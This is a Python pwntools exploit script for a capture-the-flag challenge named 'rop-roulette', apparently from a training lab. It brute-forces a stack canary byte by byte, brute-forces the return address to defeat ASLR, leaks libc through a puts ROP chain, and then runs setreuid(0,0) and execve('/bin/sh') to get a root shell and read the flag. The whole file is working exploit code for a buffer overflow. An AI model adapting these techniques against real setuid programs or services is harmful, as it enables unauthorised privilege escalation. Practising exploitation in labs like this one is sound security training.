from dataclasses import dataclass
import re
import sys
import pwn
from typing import Callable

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


@dataclass
class Static:
    offset_canary: int
    offset_callret: int
    elf: pwn.ELF


def find_offset_to_canary():
    for length in range(0x11, 0x101, 0x8):
        with pwn.process(["nc", "127.0.0.1", "1337"], stdout=pwn.PIPE, level="error") as io:
            io.sendline(pwn.cyclic(length))
            io.sendlineafter(b"Leaving!", b"")
            if b"stack smashing detected" in io.recvrepeat():
                return length - 1
    raise ValueError("failed to find offset")


def address_next_to_call(elf, in_func, call_func):
    lines = elf.functions[in_func].disasm().splitlines()
    addr_re = re.compile(r"^\s*([0-9a-fA-F]+):")
    target_hex = hex(elf.functions[call_func].address)
    for i, line in enumerate(lines):
        if "call" in line and target_hex in line:
            if i + 1 < len(lines):
                m = addr_re.match(lines[i + 1])
                if m:
                    return int(m.group(1), 16)
                raise ValueError("failed to parse next instruction address")
    raise ValueError("failed to find call instruction")


def one_round(io_maker: Callable[[], pwn.tube], static: Static):
    offset_canary = static.offset_canary
    elf = static.elf

    assert elf.libc
    libc = elf.libc

    def crack_canary():
        canary = bytearray()
        while len(canary) < 8:
            for byte in range(256):
                candidate = canary + bytes([byte])
                payload = pwn.flat(
                    {
                        offset_canary: candidate,
                    }
                )
                print(f"Trying canary: {candidate.hex(' ')}", end="\r")
                with io_maker() as io:
                    io.send(payload)
                    io.sendlineafter(b"Leaving!", b"")
                    if b"Goodbye!" in io.recvrepeat():
                        canary.append(byte)
                        break
            else:
                raise ValueError("failed to crack canary")
        return canary

    def crack_aslr():
        back_addr = bytearray()
        while len(back_addr) < 8:
            for byte in range(256):
                byte = 0xFF - byte  # 倒着来避免 nop sled
                candidate = back_addr + bytes([byte])
                payload = pwn.flat(
                    {
                        offset_canary + 0x00: canary_leak,
                        offset_canary + 0x10: candidate,
                    },
                )
                print(f"Trying back_addr: {int.from_bytes(candidate, 'little'):#x}", end="\r")
                with io_maker() as io:
                    io.send(payload)
                    io.sendlineafter(b"Leaving!\n", b"")
                    if b"Goodbye!" in io.recvrepeat(1):
                        back_addr.append(byte)
                        break
            else:
                raise ValueError("failed to crack back_addr")

        return int.from_bytes(back_addr, "little") - static.offset_callret

    def crack_libc():
        rop = pwn.ROP(elf)
        rop.call("puts", [elf.got["puts"]])
        payload = pwn.flat(
            {
                offset_canary + 0x00: canary_leak,
                offset_canary + 0x10: rop.chain(),
            },
        )
        print(pwn.hexdump(payload))
        with io_maker() as io:
            io.send(payload)
            io.sendlineafter(b"Leaving!\n", b"")
            leak_puts_addr = pwn.u64(io.recv(6).ljust(8, b"\0"))
            return leak_puts_addr - libc.symbols["puts"]

    def crack_flag():
        rop = pwn.ROP(libc)
        rop.call("setreuid", [0, 0])
        rop.call("execve", [next(libc.search(b"/bin/sh\x00")), 0, 0])
        payload = pwn.flat(
            {
                offset_canary + 0x00: canary_leak,
                offset_canary + 0x10: rop.chain(),
            },
        )
        with io_maker() as io:
            io.send(payload)
            io.sendlineafter(b"Leaving!\n", b"")
            io.sendline(b"id; cat /flag; exit")
            if b"pwn" in (out := io.recvuntil(b"}")):
                print(out.decode())

    canary_leak = crack_canary()
    pwn.log.success(f"leaked canary: {canary_leak.hex(' ')}")

    back_addr = crack_aslr()
    pwn.log.success(f"leaked base_addr: {back_addr:#x}")
    elf.address = back_addr

    libc_addr = crack_libc()
    pwn.log.success(f"leaked libc_addr: {libc_addr:#x}")
    libc.address = libc_addr

    crack_flag()


def one_round_worker(static):
    def io_maker():
        return pwn.process(["nc", "127.0.0.1", "1337"], stdout=pwn.PIPE, level="error")

    one_round(io_maker, static)


def ctf():
    # rop-roulette
    root_bin = find_challenge()

    elf = pwn.ELF(root_bin, checksec=False)
    assert elf.libc

    offset_canary = find_offset_to_canary()
    pwn.success(f"found canary offset: {offset_canary:#x}")

    offset_callret = address_next_to_call(elf, "main", "challenge")
    pwn.success(f"found offset_callret: {offset_callret:#x}")

    static = Static(offset_canary, offset_callret, elf)

    one_round_worker(static)


if __name__ == "__main__":
    ctf()
